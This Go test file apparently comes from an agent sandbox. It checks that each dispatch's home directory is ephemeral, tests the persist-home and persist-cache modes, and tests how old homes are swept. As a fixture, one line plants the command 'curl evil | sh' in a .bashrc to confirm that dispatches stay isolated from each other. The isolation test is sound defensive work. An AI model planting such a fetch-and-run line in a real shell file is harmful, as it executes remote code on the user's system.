package agentsandbox

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/NodeSpy/conductor/internal/skill"
)

func TestDispatchHomesAreEphemeral(t *testing.T) {
	ws := t.TempDir()
	reg := &Registry{}
	r := &Resolver{Registry: reg, StateRoot: t.TempDir(), GOOS: "linux"}
	pol := func(dispatch string) Policy {
		t.Helper()
		p, err := r.PolicyForEntry(Entry{Workspace: ws, Identity: "agent:fixer@acme/app", Dispatch: dispatch}, "claude", nil, skill.ProcessAnchor{})
		if err != nil {
			t.Fatal(err)
		}
		return p
	}
	a, a2, b, bot := pol("run1:fix"), pol("run1:fix"), pol("run2:fix"), pol("")
	if a.Home != a2.Home {
		t.Fatal("a dispatch's resume finds its own home")
	}
	if a.Home == b.Home || a.Home == bot.Home || b.Home == bot.Home {
		t.Fatalf("homes shared: %s %s %s", a.Home, b.Home, bot.Home)
	}
	// What one dispatch plants, the next never sees.
	os.WriteFile(filepath.Join(a.Home, ".bashrc"), []byte("curl evil | sh"), 0o600)
	if _, err := os.Stat(filepath.Join(b.Home, ".bashrc")); err == nil {
		t.Fatal("a planted rc file reached the next dispatch")
	}
	if filepath.Dir(bot.Home) != r.StateRoot {
		t.Fatalf("a launch with no dispatch keeps the identity's home: %s", bot.Home)
	}

	// persist: home — the identity's home, as before.
	r.Persist = PersistHome
	if h := pol("run3:fix").Home; h != bot.Home {
		t.Fatalf("persist home: %s, want %s", h, bot.Home)
	}

	// persist: cache — a fresh home, the identity's cache linked in.
	r.Persist = PersistCache
	c1, c2 := pol("run4:fix"), pol("run5:fix")
	if c1.Home == c2.Home {
		t.Fatal("cache mode still gives each dispatch its own home")
	}
	l1, err1 := os.Readlink(filepath.Join(c1.Home, ".cache"))
	l2, err2 := os.Readlink(filepath.Join(c2.Home, ".cache"))
	if err1 != nil || err2 != nil || l1 != l2 || !contains(c1.ReadWrite, filepath.Dir(l1)) {
		t.Fatalf("cache links %q %q (%v %v), rw %v", l1, l2, err1, err2, c1.ReadWrite)
	}

	// The sweep removes an ended session's home once it is old, never a
	// live one.
	r.Persist = PersistNone
	reg.Register(Entry{Workspace: ws, Identity: "agent:fixer@acme/app", Dispatch: "run2:fix"})
	old := time.Now().Add(-48 * time.Hour)
	for _, h := range []string{a.Home, b.Home} {
		os.Chtimes(h, old, old)
	}
	if n := r.SweepDispatchHomes(); n < 1 {
		t.Fatalf("swept %d", n)
	}
	if _, err := os.Stat(a.Home); !os.IsNotExist(err) {
		t.Fatal("an ended dispatch's old home was kept")
	}
	if _, err := os.Stat(b.Home); err != nil {
		t.Fatal("a live dispatch's home was swept")
	}
	if _, err := os.Stat(c2.Home); err != nil {
		t.Fatal("a recent home was swept")
	}
}
